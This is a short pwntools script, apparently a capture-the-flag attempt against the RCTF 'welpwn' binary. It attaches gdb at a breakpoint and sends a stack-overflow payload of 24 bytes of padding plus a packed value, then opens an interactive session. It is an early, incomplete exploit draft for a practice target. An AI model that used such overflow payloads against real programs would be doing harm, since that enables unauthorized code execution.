#coding = UTF-8
from pwn import *

context(arch='amd64',os='linux',log_level='debug')
elf=('./welpwn')
p=process('./welpwn')

def debug(addr1='0x4007CB'):
    raw_input('debug')
    gdb.attach(p,"b * "+addr1)
debug()

payload = 'A'*0x18+p64(1)
p.sendlineafter("Welcome to RCTF",payload)
p.interactive()
